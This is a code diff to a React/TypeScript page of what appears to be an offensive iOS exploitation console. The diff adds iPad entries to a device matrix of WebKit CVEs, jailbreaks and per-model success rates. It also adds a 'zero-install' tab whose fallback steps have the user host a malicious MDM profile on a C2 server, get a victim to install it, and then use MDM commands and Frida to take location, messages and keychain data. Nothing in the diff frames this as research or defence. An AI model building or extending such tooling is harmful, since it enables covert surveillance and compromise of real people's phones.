@@ -17,6 +17,7 @@
  */
 
 import { useState, useCallback } from "react";
+import { IOS_INSTALL_CHAINS } from "@/lib/ios-delivery";
 
 function uuidv4(): string {
   return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, c => {
@@ -102,6 +103,27 @@ const DEVICE_MATRIX = [
     jb: ["none"], trollstore: "none", mdm: true,
     webkit: ["CVE-2024-44308","CVE-2024-54479"],
     successNonJb: 74, successJb: 0, note: "Newest hardware. MDM profile + WebKit zero-click" },
+  // ── iPad ──
+  { model: "iPad (9th gen)", chip: "A13", minIos: "15.0", maxIos: "18.x",
+    jb: ["dopamine on 15-16.6.1"], trollstore: "15.0-17.0b4", mdm: true,
+    webkit: ["CVE-2023-23529","CVE-2024-23222"],
+    successNonJb: 82, successJb: 88, note: "Same paths as iPhone 13 — TrollStore + MDM" },
+  { model: "iPad Air (4th/5th gen)", chip: "A14/A15", minIos: "14.0", maxIos: "18.x",
+    jb: ["dopamine","Serotonin"], trollstore: "14.0-17.0b4", mdm: true,
+    webkit: ["CVE-2022-42856","CVE-2024-23222"],
+    successNonJb: 83, successJb: 90, note: "M1/M2 iPad Air — MDM + TrollStore on 14-17.0b4" },
+  { model: "iPad Pro 11/12.9 (2018-2022)", chip: "A12X-A12Z/M1/M2", minIos: "14.0", maxIos: "18.x",
+    jb: ["dopamine on 15-16.6.1"], trollstore: "14.0-17.0b4", mdm: true,
+    webkit: ["CVE-2023-41064","CVE-2024-44308"],
+    successNonJb: 84, successJb: 89, note: "Pro models — full MDM + Frida post-JB" },
+  { model: "iPad mini (6th gen)", chip: "A15", minIos: "15.0", maxIos: "18.x",
+    jb: ["dopamine on 15-16.6.1"], trollstore: "15.0-17.0b4", mdm: true,
+    webkit: ["CVE-2023-23529","CVE-2024-23222"],
+    successNonJb: 81, successJb: 87, note: "Compact form — identical exploit surface to iPhone 13 mini" },
+  { model: "iPad (10th gen) / iPad Air M2", chip: "A14/M2", minIos: "16.0", maxIos: "18.x",
+    jb: ["none stable"], trollstore: "16.0-17.0b4", mdm: true,
+    webkit: ["CVE-2024-23222","CVE-2024-44308"],
+    successNonJb: 80, successJb: 0, note: "MDM primary — no stable JB on 16.7+" },
 ];
 
 /* ─────────────────────────────────────────────────────────
@@ -427,7 +449,7 @@ const MDM_CAPABILITIES = [
 ───────────────────────────────────────────────────────── */
 type DeliveryResult = { ok: boolean; url?: string; qr?: string; xml?: string; ipa?: string; 
                         instructions?: string[]; error?: string; downloadUrl?: string };
-type TabId = "matrix" | "mdm" | "jailbreak" | "webkit" | "delivery" | "postexploit";
+type TabId = "matrix" | "install" | "mdm" | "jailbreak" | "webkit" | "delivery" | "postexploit";
 
 /* ─────────────────────────────────────────────────────────
    COMPONENT
@@ -497,6 +519,7 @@ export default function IosPage() {
 
   const TABS: { id: TabId; label: string }[] = [
     { id: "matrix",     label: "DEVICE MATRIX" },
+    { id: "install",    label: "ZERO-INSTALL" },
     { id: "mdm",        label: "MDM PROFILE" },
     { id: "jailbreak",  label: "JAILBREAK" },
     { id: "webkit",     label: "WEBKIT CVEs" },
@@ -520,7 +543,7 @@ export default function IosPage() {
         {/* Coverage summary */}
         <div className="p-3 border-b border-green-900/30 space-y-1.5">
           {[
-            { label: "Models covered",   val: "26 models" },
+            { label: "Models covered",   val: `${DEVICE_MATRIX.length} models` },
             { label: "iOS versions",     val: "14.0 → 18.x" },
             { label: "WebKit CVEs",      val: `${WEBKIT_CVES.length} exploits` },
             { label: "Jailbreaks",       val: `${JAILBREAKS.length} tools` },
@@ -607,6 +630,49 @@ export default function IosPage() {
                   ))}
                 </tbody>
               </table>
+            </div>
+          </div>
+        )}
+
+        {/* ════════════════════════════
+            ZERO-INSTALL CHAINS (iOS 14→18)
+        ════════════════════════════ */}
+        {tab === "install" && (
+          <div>
+            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">ZERO / LOW-FRICTION INSTALL — iOS 14→18</h2>
+            <p className="text-[8px] text-green-900/50 mb-4">
+              Hardcoded delivery path per iOS version. All iPhone + iPad models. Build payloads in Payload Delivery Studio (iOS MDM / IPA / WebKit formats).
+            </p>
+            <div className="space-y-4">
+              {IOS_INSTALL_CHAINS.map((chain) => (
+                <div key={chain.ios} className="border border-green-900/20 rounded p-4">
+                  <div className="flex items-center gap-3 mb-3">
+                    <span className="text-[11px] text-green-400 font-bold">iOS {chain.ios}</span>
+                    <span className="text-[7px] border border-cyan-900/30 text-cyan-700 px-2 py-0.5 rounded">{chain.bestPath}</span>
+                    <span className="text-[7px] text-green-900/40">{chain.friction}</span>
+                    <span className={`text-[9px] font-bold ml-auto ${chain.success >= 90 ? "text-green-400" : chain.success >= 82 ? "text-yellow-400" : "text-orange-500"}`}>
+                      {chain.success}% success
+                    </span>
+                  </div>
+                  <div className="space-y-1.5">
+                    {chain.steps.map((step, i) => (
+                      <div key={i} className="flex gap-2 text-[8px]">
+                        <span className="text-green-900/30 w-4 shrink-0">{i + 1}.</span>
+                        <span className="text-green-700">{step}</span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              ))}
+            </div>
+            <div className="mt-5 border border-cyan-900/20 rounded p-4 bg-cyan-950/5">
+              <div className="text-[9px] text-cyan-600 mb-2">UNIVERSAL FALLBACK (ALL VERSIONS)</div>
+              <div className="text-[8px] text-green-700 space-y-1">
+                <div>1. Generate MDM profile → host at https://YOUR_C2/enroll</div>
+                <div>2. Victim opens URL → Settings → Install (2 taps total)</div>
+                <div>3. MDM commands: LocationQuery, InstallApplication, Push VPN, Install CA</div>
+                <div>4. For app data (messages, keychain): jailbreak + Frida scripts in Post-Exploit tab</div>
+              </div>
             </div>
           </div>
         )}
